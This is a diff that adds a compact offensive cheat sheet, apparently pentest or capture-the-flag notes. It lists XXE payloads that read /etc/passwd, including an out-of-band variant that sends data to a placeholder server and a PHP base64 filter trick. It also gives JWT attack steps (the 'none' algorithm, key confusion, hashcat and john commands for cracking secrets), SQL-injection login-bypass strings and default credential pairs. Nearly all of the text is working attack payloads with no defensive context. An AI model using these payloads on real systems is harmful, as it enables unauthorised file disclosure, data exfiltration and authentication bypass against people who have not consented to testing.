@@ -1,0 +1,37 @@
+XXE
+xml# Basic
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><data>&xxe;</data></root>
+
+# Blind OOB
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://yourserver.com/?data=exfil">]>
+<root><data>&xxe;</data></root>
+
+# PHP base64
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<root><data>&xxe;</data></root>
+
+JWT Attacks
+bash# None algorithm
+# Change "alg":"HS256" → "alg":"none", remove signature
+
+# Crack secret
+hashcat -a 0 -m 16500 <jwt> wordlist.txt
+john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
+
+# python-jwt / PyJWT confusion
+# Change alg to HS256, sign with RS256 public key as secret
+
+Auth Bypass
+admin'--
+admin'#
+' OR '1'='1'--
+admin' OR 1=1--
+' OR 1=1 LIMIT 1--
+
+# Default creds
+admin:admin | admin:password | admin:123456
+root:root | guest:guest | test:test
